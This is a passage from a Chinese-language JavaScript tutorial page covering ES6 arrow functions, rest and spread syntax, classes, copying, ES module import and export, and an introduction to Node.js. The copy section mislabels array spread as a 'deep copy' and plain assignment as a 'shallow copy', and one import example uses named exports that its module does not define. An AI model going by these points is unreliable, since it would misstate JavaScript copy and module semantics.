<li><p><strong>不支持 <code>arguments</code> 对象</strong>：</p>
<ul>
<li>可以通过剩余参数（rest parameters）替代 <code>arguments</code> 对象。</li>
</ul>
</li>
<li><p><strong>不能用作构造函数</strong>：</p>
<ul>
<li>不能使用 <code>new</code> 关键字来实例化对象。</li>
</ul>
</li>
</ol>
<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>1、<strong>单参数无返回值</strong></p>
<p>如果函数只有一个参数并且没有返回值，可以省略括号和 <code>return</code> 关键字：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">greet</span> = name =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hello, <span class="subst">$&#123;name&#125;</span>!`</span>);</span><br></pre></td></tr></table></figure>

<p>2、<strong>单参数有返回值</strong></p>
<p>如果函数有一个参数并需要返回一个值，可以省略括号，但需要用大括号 <code>&#123;&#125;</code> 包裹函数体，并使用 <code>return</code> 语句；或进一步简化为一行，省略大括号和 <code>return</code>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">double</span> = x =&gt; &#123; <span class="keyword">return</span> x * <span class="number">2</span>; &#125;;</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">double</span> = x =&gt; x * <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>3、<strong>多参数</strong></p>
<p>如果有多个参数，则需要用括号包裹参数列表：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">add</span> = (<span class="params">a, b</span>) =&gt; a + b;</span><br></pre></td></tr></table></figure>

<p>4、<strong>无参数</strong></p>
<p>如果没有参数，则需要用空括号表示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">sayHello</span> = (<span class="params"></span>) =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>5、 <strong>多行函数体</strong></p>
<p>如果函数体包含多条语句，则需要用大括号 <code>&#123;&#125;</code> 包裹，并显式地使用 <code>return</code> 语句：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">multiplyAndLog</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> result = a * b;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="箭头函数与普通函数的区别"><a href="#箭头函数与普通函数的区别" class="headerlink" title="箭头函数与普通函数的区别"></a>箭头函数与普通函数的区别</h3><ol>
<li><p><strong><code>this</code> 关键字的行为</strong></p>
<ul>
<li><strong>普通函数</strong>：<code>this</code> 的值取决于函数的调用方式，通常指向调用该函数的对象。</li>
</ul>
</li>
</ol>
<ul>
<li><strong>箭头函数</strong>：<code>this</code> 的值继承自外层作用域，在箭头函数中 <code>this</code> 不会改变。</li>
</ul>
<ol start="2">
<li><p><strong>不能作为构造函数</strong>：箭头函数不能用作构造函数，即不能使用 <code>new</code> 关键字来实例化对象。</p>
</li>
<li><p><strong>没有 <code>arguments</code> 对象</strong>：箭头函数内部没有自己的 <code>arguments</code> 对象，但可以通过剩余参数（rest parameters）来实现类似的功能。</p>
</li>
</ol>
<h3 id="实际应用场景"><a href="#实际应用场景" class="headerlink" title="实际应用场景"></a>实际应用场景</h3><h4 id="1-回调函数"><a href="#1-回调函数" class="headerlink" title="1. 回调函数"></a>1. <strong>回调函数</strong></h4><p>箭头函数非常适合用于简写回调函数，特别是在数组操作方法（如 <code>map</code>、<code>filter</code>、<code>reduce</code> 等）中。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">let</span> doubled = numbers.<span class="title function_">map</span>(<span class="function"><span class="params">x</span> =&gt;</span> x * <span class="number">2</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(doubled); <span class="comment">// 输出: [2, 4, 6, 8]</span></span><br></pre></td></tr></table></figure>

<h4 id="2-事件处理"><a href="#2-事件处理" class="headerlink" title="2. 事件处理"></a>2. <strong>事件处理</strong></h4><p>在处理DOM事件时，箭头函数可以帮助避免 <code>this</code> 关键字的混淆问题。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myButton&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">// this 继承自外层作用域</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="3-定时器和异步代码"><a href="#3-定时器和异步代码" class="headerlink" title="3. 定时器和异步代码"></a>3. <strong>定时器和异步代码</strong></h4><p>在定时器或异步代码中，箭头函数可以确保 <code>this</code> 的正确性。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Timer</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">seconds</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">seconds</span>++;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">seconds</span>);</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> timer = <span class="keyword">new</span> <span class="title class_">Timer</span>();</span><br><span class="line"><span class="comment">// 每秒输出递增的秒数</span></span><br></pre></td></tr></table></figure>





<h2 id="对象创建和拷贝"><a href="#对象创建和拷贝" class="headerlink" title="对象创建和拷贝"></a>对象创建和拷贝</h2><h3 id="rest参数和spread操作符"><a href="#rest参数和spread操作符" class="headerlink" title="rest参数和spread操作符"></a>rest参数和spread操作符</h3><h4 id="rest"><a href="#rest" class="headerlink" title="rest"></a>rest</h4><p><strong>rest类似于Java中的函数可变参数</strong>。<strong>Rest 参数</strong>允许我们将不定数量的参数表示为一个数组。它通常用于定义函数时，当不确定传入多少个参数时使用。</p>
<p><strong>使用示例</strong>：</p>
<p>可以在函数定义中同时使用普通参数和 rest 参数，也可以单独使用rest参数，如下文中，<code>...numbers</code>就是所谓的rest参数。注意，rest 参数必须放在最后。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">multiplyAndAdd</span>(<span class="params">base, ...numbers</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> numbers.<span class="title function_">map</span>(<span class="function"><span class="params">num</span> =&gt;</span> base * num).<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, curr</span>) =&gt;</span> acc + curr, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Spread-操作符"><a href="#Spread-操作符" class="headerlink" title="Spread 操作符"></a>Spread 操作符</h4><p>spread其实就是rest参数在实参上的应用。<strong>Spread 操作符</strong>用于将数组或对象“展开”成独立的元素，适用于函数调用、数组构造以及对象合并等场景。</p>
<p><strong>使用示例</strong></p>
<ol>
<li><p><strong>数组展开</strong>：可以使用 spread 操作符来展开数组，从而实现数组的<code>浅拷贝</code>或合并。</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> arr2 = [...arr1, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr2); <span class="comment">// 输出: [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>函数调用中的应用</strong>：在函数调用时，可以用 spread 操作符将数组展开为参数列表。</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b, c</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b + c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(...numbers)); <span class="comment">// 输出: 6</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>对象展开</strong>：可以使用 spread 操作符来合并对象属性，实现对象的浅拷贝或合并。</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj1 = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123; ...obj1, <span class="attr">c</span>: <span class="number">3</span> &#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj2); <span class="comment">// 输出: &#123; a: 1, b: 2, c: 3 &#125;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="类和对象语法糖"><a href="#类和对象语法糖" class="headerlink" title="类和对象语法糖"></a>类和对象语法糖</h3><p>ES6中新增了对象创建的语法糖，支持class, extends, constructor等关键字，让ES6的语法和面向对象的语法更接近</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">person</span>&#123;</span><br><span class="line">            <span class="comment">// 属性</span></span><br><span class="line">            #name;      <span class="comment">// 私有属性带 #，后面都需要带 #</span></span><br><span class="line">            age;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">get</span> <span class="title function_">name</span>()&#123;         <span class="comment">// get方法设置</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">this</span>.#name;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">set</span> <span class="title function_">name</span>(<span class="params">n</span>)&#123;        <span class="comment">// set方法设置</span></span><br><span class="line">                <span class="variable language_">this</span>.#name = n;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_">eat</span>(<span class="params">food</span>)&#123;  <span class="comment">// 实例方法</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;eat&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">static</span> <span class="title function_">grow</span>(<span class="params">a,b</span>)&#123;   <span class="comment">//静态方法</span></span><br><span class="line">                <span class="keyword">return</span> a+b;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_">constructor</span>(<span class="params">name,age</span>)&#123;  <span class="comment">//构造器</span></span><br><span class="line">                <span class="variable language_">this</span>.#name = name;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 继承语法和Java一致</span></span><br></pre></td></tr></table></figure>



<h3 id="深拷贝和浅拷贝"><a href="#深拷贝和浅拷贝" class="headerlink" title="深拷贝和浅拷贝"></a>深拷贝和浅拷贝</h3><p><strong>与Java不同！</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="comment">/*浅拷贝：指向的是同一个地址*/</span></span><br><span class="line"><span class="keyword">let</span> arr2 = arr</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">100</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr2); <span class="comment">// 100</span></span><br><span class="line"><span class="comment">/*深拷贝：指向的是不同地址*/</span></span><br><span class="line"><span class="keyword">let</span> arr3 = [...arr]</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr3); <span class="comment">// 100</span></span><br><span class="line"><span class="comment">// 对象进行JSON转换也是深拷贝</span></span><br></pre></td></tr></table></figure>





<h2 id="模块化处理"><a href="#模块化处理" class="headerlink" title="模块化处理"></a>模块化处理</h2><p>ES6（ECMAScript 2015）引入了原生的模块化支持，允许开发者将代码分割成多个文件，并通过 <code>import</code> 和 <code>export</code> 关键字来导入和导出模块。这种模块化机制提供了更好的代码组织、可维护性和复用性。</p>
<p>在 ES6 中，每个 JavaScript 文件被视为一个独立的模块。模块可以包含变量、函数、类等，并且可以通过 <code>export</code> 关键字将其公开给其他模块使用。其他模块则可以通过 <code>import</code> 关键字来导入这些公开的内容。</p>
<h3 id="导出模块（Export）"><a href="#导出模块（Export）" class="headerlink" title="导出模块（Export）"></a>导出模块（Export）</h3><h4 id="1-命名导出（Named-Export）"><a href="#1-命名导出（Named-Export）" class="headerlink" title="1. 命名导出（Named Export）"></a>1. <strong>命名导出（Named Export）</strong></h4><p>你可以从一个模块中导出多个变量、函数或类，并为它们指定名称。这被称为<strong>命名导出</strong>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// math.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">subtract</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">PI</span> = <span class="number">3.14159</span>;</span><br></pre></td></tr></table></figure>

<p>你也可以在一个文件中定义所有需要导出的内容，然后在文件末尾一次性导出：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// math.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">subtract</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PI</span> = <span class="number">3.14159</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; add, subtract, <span class="variable constant_">PI</span> &#125;;</span><br></pre></td></tr></table></figure>

<h4 id="2-默认导出（Default-Export）"><a href="#2-默认导出（Default-Export）" class="headerlink" title="2. 默认导出（Default Export）"></a>2. <strong>默认导出（Default Export）</strong></h4><p>每个模块只能有一个默认导出。默认导出不需要指定名称，通常用于导出单个主要功能或对象。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// calculator.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> (<span class="params">a, b, operation</span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (operation) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;add&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> a + b;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;subtract&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> a - b;</span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Unknown operation&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="导入模块（Import）"><a href="#导入模块（Import）" class="headerlink" title="导入模块（Import）"></a>导入模块（Import）</h3><h4 id="1-导入命名导出"><a href="#1-导入命名导出" class="headerlink" title="1. 导入命名导出"></a>1. <strong>导入命名导出</strong></h4><p>要导入命名导出的内容，必须使用与导出时相同的名称，并将其包裹在花括号 <code>&#123;&#125;</code> 中。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; add, subtract, <span class="variable constant_">PI</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./math.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">2</span>, <span class="number">3</span>)); <span class="comment">// 输出: 5</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">subtract</span>(<span class="number">5</span>, <span class="number">2</span>)); <span class="comment">// 输出: 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable constant_">PI</span>); <span class="comment">// 输出: 3.14159</span></span><br></pre></td></tr></table></figure>

<p>如果你不想使用原始名称，可以通过 <code>as</code> 关键字进行重命名：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; add <span class="keyword">as</span> sum, subtract <span class="keyword">as</span> diff &#125; <span class="keyword">from</span> <span class="string">&#x27;./math.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(<span class="number">2</span>, <span class="number">3</span>)); <span class="comment">// 输出: 5</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">diff</span>(<span class="number">5</span>, <span class="number">2</span>)); <span class="comment">// 输出: 3</span></span><br></pre></td></tr></table></figure>

<h4 id="2-导入默认导出"><a href="#2-导入默认导出" class="headerlink" title="2. 导入默认导出"></a>2. <strong>导入默认导出</strong></h4><p>导入默认导出的内容时，可以为其指定任意名称：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> calculator <span class="keyword">from</span> <span class="string">&#x27;./calculator.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">calculator</span>(<span class="number">10</span>, <span class="number">5</span>, <span class="string">&#x27;add&#x27;</span>)); <span class="comment">// 输出: 15</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">calculator</span>(<span class="number">10</span>, <span class="number">5</span>, <span class="string">&#x27;subtract&#x27;</span>)); <span class="comment">// 输出: 5</span></span><br></pre></td></tr></table></figure>

<p>你也可以同时导入命名导出和默认导出：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> calculator, &#123; add, subtract &#125; <span class="keyword">from</span> <span class="string">&#x27;./calculator.js&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="3-导入所有内容"><a href="#3-导入所有内容" class="headerlink" title="3. 导入所有内容"></a>3. <strong>导入所有内容</strong></h4><p>你可以使用 <code>*</code> 语法导入模块中的所有内容，并将其作为一个对象引用：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> math <span class="keyword">from</span> <span class="string">&#x27;./math.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(math.<span class="title function_">add</span>(<span class="number">2</span>, <span class="number">3</span>)); <span class="comment">// 输出: 5</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(math.<span class="title function_">subtract</span>(<span class="number">5</span>, <span class="number">2</span>)); <span class="comment">// 输出: 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(math.<span class="property">PI</span>); <span class="comment">// 输出: 3.14159</span></span><br></pre></td></tr></table></figure>

<h3 id="动态导入（Dynamic-Import）"><a href="#动态导入（Dynamic-Import）" class="headerlink" title="动态导入（Dynamic Import）"></a>动态导入（Dynamic Import）</h3><p>ES6 还支持动态导入，即在运行时按需加载模块。这对于优化性能非常有用，尤其是在需要延迟加载某些模块的情况下。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态导入示例</span></span><br><span class="line">button.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">import</span>(<span class="string">&#x27;./module.js&#x27;</span>)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">module</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">module</span>.<span class="title function_">functionName</span>();</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Module loading failed:&#x27;</span>, error);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>从 ES2020 开始，还可以使用 <code>await</code> 来简化异步导入：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">loadModule</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="variable language_">module</span> = <span class="keyword">await</span> <span class="keyword">import</span>(<span class="string">&#x27;./module.js&#x27;</span>);</span><br><span class="line">        <span class="variable language_">module</span>.<span class="title function_">functionName</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Module loading failed:&#x27;</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="模块的作用域和隔离"><a href="#模块的作用域和隔离" class="headerlink" title="模块的作用域和隔离"></a>模块的作用域和隔离</h3><p>每个模块都有自己的作用域，这意味着在一个模块中声明的变量、函数或类不会影响其他模块。只有通过 <code>export</code> 导出的内容才能被其他模块访问。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// moduleA.js</span></span><br><span class="line"><span class="keyword">let</span> privateVar = <span class="string">&#x27;I am private&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">publicFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> privateVar;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; publicFunction &#125; <span class="keyword">from</span> <span class="string">&#x27;./moduleA.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">publicFunction</span>()); <span class="comment">// 输出: I am private</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(privateVar); <span class="comment">// 报错: privateVar is not defined</span></span><br></pre></td></tr></table></figure>



<h3 id="实际应用场景-1"><a href="#实际应用场景-1" class="headerlink" title="实际应用场景"></a>实际应用场景</h3><h4 id="1-代码组织和复用"><a href="#1-代码组织和复用" class="headerlink" title="1. 代码组织和复用"></a>1. <strong>代码组织和复用</strong></h4><p>模块化使得代码更加有条理，便于管理和维护。不同的功能可以放在不同的模块中，避免了全局命名空间的污染。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// utils.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">formatDate</span>(<span class="params">date</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> date.<span class="title function_">toISOString</span>().<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">formatCurrency</span>(<span class="params">amount</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> amount.<span class="title function_">toLocaleString</span>(<span class="string">&#x27;en-US&#x27;</span>, &#123; <span class="attr">style</span>: <span class="string">&#x27;currency&#x27;</span>, <span class="attr">currency</span>: <span class="string">&#x27;USD&#x27;</span> &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; formatDate, formatCurrency &#125; <span class="keyword">from</span> <span class="string">&#x27;./utils.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> today = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">formatDate</span>(today)); <span class="comment">// 输出: 当前日期的ISO格式字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> price = <span class="number">1234.56</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">formatCurrency</span>(price)); <span class="comment">// 输出: $1,234.56</span></span><br></pre></td></tr></table></figure>

<h4 id="2-第三方库的集成"><a href="#2-第三方库的集成" class="headerlink" title="2. 第三方库的集成"></a>2. <strong>第三方库的集成</strong></h4><p>许多现代前端框架和库都采用模块化设计，使得你可以轻松地集成第三方库。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用 Lodash 库</span></span><br><span class="line"><span class="keyword">import</span> _ <span class="keyword">from</span> <span class="string">&#x27;lodash&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">let</span> doubled = _.<span class="title function_">map</span>(numbers, <span class="function"><span class="params">num</span> =&gt;</span> num * <span class="number">2</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(doubled); <span class="comment">// 输出: [2, 4, 6, 8]</span></span><br></pre></td></tr></table></figure>

<h4 id="3-代码分割和懒加载"><a href="#3-代码分割和懒加载" class="headerlink" title="3. 代码分割和懒加载"></a>3. <strong>代码分割和懒加载</strong></h4><p>通过动态导入，可以在需要时才加载模块，从而减少初始加载时间并提高应用性能。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态加载路由组件</span></span><br><span class="line"><span class="keyword">if</span> (userIsLoggedIn) &#123;</span><br><span class="line">    <span class="keyword">import</span>(<span class="string">&#x27;./dashboard.js&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">dashboard</span> =&gt;</span> &#123;</span><br><span class="line">        dashboard.<span class="title function_">render</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">import</span>(<span class="string">&#x27;./login.js&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">login</span> =&gt;</span> &#123;</span><br><span class="line">        login.<span class="title function_">render</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>ES6 的模块化机制提供了一种强大的方式来组织和管理代码，使得开发大型应用程序变得更加容易。以下是其主要特点和优势：</p>
<ol>
<li><strong>清晰的作用域</strong>：每个模块都有独立的作用域，避免了全局命名空间的污染。</li>
<li><strong>命名导出和默认导出</strong>：支持多种导出方式，满足不同的需求。</li>
<li><strong>灵活的导入方式</strong>：可以根据需要选择导入特定内容或整个模块。</li>
<li><strong>动态导入</strong>：支持按需加载模块，有助于优化性能。</li>
<li><strong>代码复用和维护</strong>：模块化使代码更易于复用和维护，提升了开发效率。</li>
</ol>
<p>通过合理使用 ES6 的模块化特性，开发者可以构建更加健壮、高效和可维护的应用程序。无论是在小型项目还是大型系统中，模块化都是提升代码质量和开发体验的重要工具。</p>
<hr>
<h1 id="Node-js-NPM"><a href="#Node-js-NPM" class="headerlink" title="Node.js&amp;NPM"></a>Node.js&amp;NPM</h1><p><strong>Node.js</strong> 是一个基于 Chrome V8 引擎的 JavaScript 运行时，它使得开发者可以使用 JavaScript 编写服务器端应用程序。Node.js 的设计初衷是为了提供一种高效的方式来处理 I&#x2F;O 密集型任务，如文件系统操作、网络请求等。有了Node.js后，JavaScript就从一个普通的前端语言转变成可以操作服务器文件的全栈语言。</p>
<p><strong>主要特点：</strong></p>
<ol>
<li><strong>事件驱动和非阻塞 I&#x2F;O</strong>：Node.js 使用事件循环（Event Loop）来处理异步操作，这使得它可以非常高效地处理并发请求。</li>
<li><strong>单线程模型</strong>：尽管是单线程，但由于其异步和非阻塞特性，Node.js 仍然能够处理大量并发连接。</li>
<li><strong>跨平台支持</strong>：可以在 Windows、macOS 和 Linux 等多种操作系统上运行。</li>
<li><strong>丰富的生态系统</strong>：通过 npm（Node Package Manager），Node.js 拥有庞大的第三方库和工具生态系统。</li>
</ol>
